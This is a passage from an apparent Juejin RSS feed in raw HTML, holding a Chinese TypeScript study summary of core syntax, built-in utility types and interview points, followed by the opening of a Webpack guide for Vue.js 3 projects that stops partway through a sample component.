<p>如果不是——那就给它上把锁吧 🔒</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript 知识总结]]></title>    <link>https://juejin.cn/post/7595021656427364379</link>    <guid>https://juejin.cn/post/7595021656427364379</guid>    <pubDate>2026-01-14T08:00:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656427364379" data-draft-id="7594919272688173082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript 知识总结"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:00:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="米诺zuo"/> <meta itemprop="url" content="https://juejin.cn/user/2436173497373399"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript 知识总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173497373399/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    米诺zuo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:00:14.000Z" title="Wed Jan 14 2026 08:00:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">目录</h2>
<ol>
<li><a href="#1-typescript-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8" title="#1-typescript-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8">TypeScript 基础入门</a></li>
<li><a href="#2-%E6%A0%B8%E5%BF%83%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%9E%8B%E8%A7%A3%E6%9E%90" title="#2-%E6%A0%B8%E5%BF%83%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%9E%8B%E8%A7%A3%E6%9E%90">核心内置工具类型解析</a></li>
<li><a href="#3-%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7" title="#3-%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7">高级特性</a></li>
<li><a href="#4-%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95-typescript-%E9%87%8D%E7%82%B9" title="#4-%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95-typescript-%E9%87%8D%E7%82%B9">前端面试 TypeScript 重点</a></li>
</ol>
<hr/>
<h2 data-id="heading-1">1. TypeScript 基础入门</h2>
<p>TypeScript 是 JavaScript 的超集，添加了静态类型系统。掌握它是现代前端开发（尤其是 Angular/Vue 3）的基石。</p>
<h3 data-id="heading-2">1.1 为什么要用 TypeScript？</h3>
<ul>
<li><strong>类型安全：</strong> 在编译阶段发现错误，而不是运行时。</li>
<li><strong>更好的代码提示：</strong> IDE 可以根据类型提供精准的自动补全。</li>
<li><strong>代码可维护性：</strong> 接口即文档，让大型项目结构更清晰。</li>
</ul>
<h3 data-id="heading-3">1.2 核心基础概念</h3>
<h4 data-id="heading-4">接口</h4>
<p>定义对象的结构，充当数据的“契约”。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  email?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 可选属性</span>
}
<span class="hljs-keyword">const</span> <span class="hljs-attr">u</span>: <span class="hljs-title class_">User</span> = { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span> };
</code></pre>
<h4 data-id="heading-5">类</h4>
<p>面向对象编程的基础，Angular 的组件本质上就是一个类。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> {
  <span class="hljs-attr">brand</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">brand: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  }
  <span class="hljs-title function_">drive</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.brand}</span> is driving`</span>);
  }
}
</code></pre>
<h4 data-id="heading-6">装饰器</h4>
<p>一种特殊的语法，用 <code>@</code> 符号标记，用于修改类或属性的行为。Angular 大量使用装饰器（如 <code>@Component</code>, <code>@Injectable</code>）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>({
  <span class="hljs-attr">selector</span>: <span class="hljs-string">'app-root'</span>,
  <span class="hljs-attr">template</span>: <span class="hljs-string">'Hello World'</span>
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppComponent</span> {}
</code></pre>
<h4 data-id="heading-7">泛型</h4>
<p>将类型参数化，提高代码复用性。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-keyword">return</span> arg;
}
<span class="hljs-comment">// 使用时指定类型</span>
identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"Hello"</span>);
</code></pre>
<h4 data-id="heading-8">访问修饰符</h4>
<p>控制类成员的访问权限：</p>
<ul>
<li><code>public</code>: 公开，默认值。</li>
<li><code>private</code>: 私有，仅类内部可见。</li>
<li><code>protected</code>: 受保护，仅类及其子类可见。</li>
</ul>
<hr/>
<h2 data-id="heading-9">2. 核心内置工具类型解析</h2>
<p>TypeScript 提供了一系列全局工具类型，用于操作和转换类型。理解它们的源码对于进阶至关重要。</p>
<h3 data-id="heading-10">2.1 Partial - 可选化</h3>
<p><strong>作用：</strong> 将类型 <code>T</code> 的所有属性变为可选。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Partial</span>&lt;T&gt; = {
  [P <span class="hljs-keyword">in</span> keyof T]?: T[P];
};
</code></pre>
<ul>
<li><strong>解析：</strong> 遍历 <code>T</code> 的所有属性 <code>P</code>，加上 <code>?</code> 修饰符。</li>
</ul>
<h3 data-id="heading-11">2.2 Required - 必选化</h3>
<p><strong>作用：</strong> 将类型 <code>T</code> 的所有属性变为必选（与 <code>Partial</code> 相反）。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Required</span>&lt;T&gt; = {
    [P <span class="hljs-keyword">in</span> keyof T]-?: T[P];
};
</code></pre>
<ul>
<li><strong>解析：</strong> 这里的 <code>-?</code> 是核心，意为“移除可选修饰符”。</li>
</ul>
<h3 data-id="heading-12">2.3 Pick - 挑选属性</h3>
<p><strong>作用：</strong> 从 <code>T</code> 中挑选一组属性 <code>K</code>，构成新类型。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Pick</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = {
    [P <span class="hljs-keyword">in</span> K]: T[P];
};
</code></pre>
<ul>
<li><strong>解析：</strong>
<ul>
<li><code>K extends keyof T</code>: 约束 <code>K</code> 必须是 <code>T</code> 的属性名。</li>
<li><code>[P in K]</code>: 遍历挑选出的属性。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-13">2.4 Record - 构建对象类型</h3>
<p><strong>作用：</strong> 构建一个对象类型，键名为 <code>K</code>，键值类型为 <code>T</code>。常用于定义字典。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Record</span>&lt;K <span class="hljs-keyword">extends</span> keyof <span class="hljs-built_in">any</span>, T&gt; = {
    [P <span class="hljs-keyword">in</span> K]: T;
};
</code></pre>
<ul>
<li><strong>解析：</strong>
<ul>
<li><code>keyof any</code>: 等价于 <code>string | number | symbol</code>，限制键名类型。</li>
<li>所有属性的值都被统一设为 <code>T</code>。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-14">2.5 Exclude - 排除联合类型成员</h3>
<p><strong>作用：</strong> 从联合类型 <code>T</code> 中排除 <code>U</code>。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Exclude</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;
</code></pre>
<ul>
<li><strong>解析：</strong> 利用<strong>分布式条件类型</strong>。
<ul>
<li>如果 <code>T</code> 中的成员属于 <code>U</code>，返回 <code>never</code>（在联合类型中会被丢弃）。</li>
<li>如果不属于，保留原类型。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-15">2.6 ReturnType - 获取函数返回值类型</h3>
<p><strong>作用：</strong> 获取函数 <code>T</code> 的返回值类型。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; infer R ? R : <span class="hljs-built_in">any</span>;
</code></pre>
<ul>
<li><strong>解析：</strong>
<ul>
<li><code>infer R</code>: 推断关键字，表示捕获函数返回位置的类型，并赋值给 <code>R</code>。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-16">3. 高级特性</h2>
<h3 data-id="heading-17">3.1 类型断言</h3>
<p>手动指定值的类型，绕过编译器的检查。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"input"</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLInputElement</span>;
</code></pre>
<h3 data-id="heading-18">3.2 类型守卫</h3>
<p>在运行时确保类型的安全。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">"string"</span>) {
  <span class="hljs-comment">// 这里 TS 知道 value 是 string</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toUpperCase</span>());
}
</code></pre>
<h3 data-id="heading-19">3.3 联合类型与交叉类型</h3>
<ul>
<li><code>A | B</code>: 表示 A 或 B（“或”逻辑）。</li>
<li><code>A &amp; B</code>: 表示同时具备 A 和 B 的属性（“且”逻辑）。</li>
</ul>
<hr/>
<h2 data-id="heading-20">4. 前端面试 TypeScript 重点</h2>
<p>在面试中，除了基础语法，建议重点准备以下内容：</p>
<h3 data-id="heading-21">4.1 <code>interface</code> vs <code>type</code></h3>
<ul>
<li><strong>Interface:</strong> 只能定义对象，支持继承 (<code>extends</code>) 和同名自动合并。</li>
<li><strong>Type:</strong> 更灵活，支持定义联合类型、元组等，不支持合并，但可以使用交叉类型。</li>
</ul>
<h3 data-id="heading-22">4.2 <code>any</code> vs <code>unknown</code></h3>
<ul>
<li><code>any</code>: 任意类型，关闭类型检查（不推荐滥用）。</li>
<li><code>unknown</code>: 类型安全的任意类型，使用前必须进行类型收窄。</li>
</ul>
<h3 data-id="heading-23">4.3 <code>readonly</code> vs <code>const</code></h3>
<ul>
<li><code>const</code>: 用于变量，防止变量重新赋值。</li>
<li><code>readonly</code>: 用于属性，防止属性被修改（可以配合接口使用）。</li>
</ul>
<h3 data-id="heading-24">4.4 泛型约束</h3>
<p>如何限制泛型的范围：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lengthwise</span> {
  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">function</span> loggingIdentity&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Lengthwise</span>&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arg.<span class="hljs-property">length</span>); <span class="hljs-comment">// 现在可以放心使用 .length 了</span>
  <span class="hljs-keyword">return</span> arg;
}
</code></pre>
<h3 data-id="heading-25">4.5 <code>keyof</code> 与 映射类型</h3>
<ul>
<li><code>keyof</code>: 获取类型的所有键，返回联合类型。</li>
<li>映射类型 (<code>[P in keyof T]</code>): 类似 JS 的 <code>for...in</code>，用于遍历和生成新类型。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue.js 3 项目构建神器：Webpack 全攻略]]></title>    <link>https://juejin.cn/post/7595021656427511835</link>    <guid>https://juejin.cn/post/7595021656427511835</guid>    <pubDate>2026-01-14T08:24:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656427511835" data-draft-id="7595028805157765130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue.js 3 项目构建神器：Webpack 全攻略"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:24:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="全栈王校长"/> <meta itemprop="url" content="https://juejin.cn/user/2295436010076631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue.js 3 项目构建神器：Webpack 全攻略
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2295436010076631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    全栈王校长
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:24:21.000Z" title="Wed Jan 14 2026 08:24:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是全栈王校长。</p>
<p>看到这个标题，很多朋友可能会纳闷：现在不是都用 Vite 吗，为什么还要学 Webpack？原因很简单：在大型企业级项目中，稳定性和成熟度才是最重要的考量因素。Webpack 自2013年问世以来，经过了多年的发展和实践检验，生态体系非常完善，几乎任何构建问题都能找到现成的解决方案。而 Vite 虽然轻快，但毕竟2020年才正式发布，生态积淀相对较少。</p>
<p>因此，今天我们就来聊聊如何用 Webpack 构建 Vue.js 3 应用。首先，我们得搞清楚 Webpack 和 Vite 的本质差异，这样才能选对工具。</p>
<h2 data-id="heading-0">Webpack vs Vite：本质差异在哪？</h2>
<p>我一直认为，评判技术的好坏必须结合它的设计初衷。Webpack 和 Vite 的根本区别在于它们的设计理念完全不同。</p>
<p>Vite 定位为现代 Web 开发工具链，它集成了多种构建功能，开发者可以开箱即用。它利用浏览器原生 ES 模块支持，在开发阶段实现快速热更新。</p>
<p>相比之下，Webpack 专注于构建打包本身，它更像是一个构建平台，需要开发者手动配置各种插件和加载器才能实现完整的构建流程。虽然配置复杂，但它提供了更大的灵活性和控制力。</p>
<p>那么，两者的技术能力或者功能有什么异同点呢？</p>
<p>这两种工具在功能上有不少相似之处，都是用来处理前端代码的打包工作。不过它们的实现方式不同：Vite 提供了更多开箱即用的功能，减少了配置工作；而 Webpack 则更灵活，但也需要更多的手动配置。</p>
<p>在实际的企业项目中，稳定可靠比便捷更重要。虽然 Webpack 需要多花些时间配置，但一旦设置好了，后续开发就很稳定。</p>
<p>下面，我们来一步步搭建一个基于 Webpack 的 Vue.js 3 项目。</p>
<h2 data-id="heading-1">Webpack + Vue.js 3 项目搭建全流程</h2>
<p>搭建项目的基本流程包括以下几个环节：</p>
<ol>
<li>准备项目结构和基础代码；</li>
<li>安装必要的依赖包；</li>
<li>设置 Webpack 对 Vue.js 3 的编译选项；</li>
<li>运行编译命令。</li>
</ol>
<p><strong>第一步：规划项目结构</strong>，标准布局如下：</p>
<pre><code class="hljs language-lua" lang="lua">.
├── dist/*
├── <span class="hljs-built_in">package</span>.json
├── src
│   ├── app.vue
│   └── index.js
└── webpack.<span class="hljs-built_in">config</span>.js
</code></pre>
<p>各文件夹及文件的作用说明：</p>
<ul>
<li>dist：存放编译后的成品文件，包括 JS、CSS、HTML 等浏览器可直接运行的静态资源；</li>
<li>package.json：项目配置文件，记录了项目依赖、版本号及脚本命令等信息；</li>
<li>src：源代码存放目录，所有开发工作都在此目录下进行；</li>
<li>webpack.config.js：Webpack 配置文件，定义了如何处理和打包我们的代码。</li>
</ul>
<p>接着我们在 src 目录下创建两个核心文件。首先是组件文件 src/app.vue，代码如下：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"demo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text"</span>&gt;</span>Count: {{state.count}}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"onClick"</span>&gt;</span>Add<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
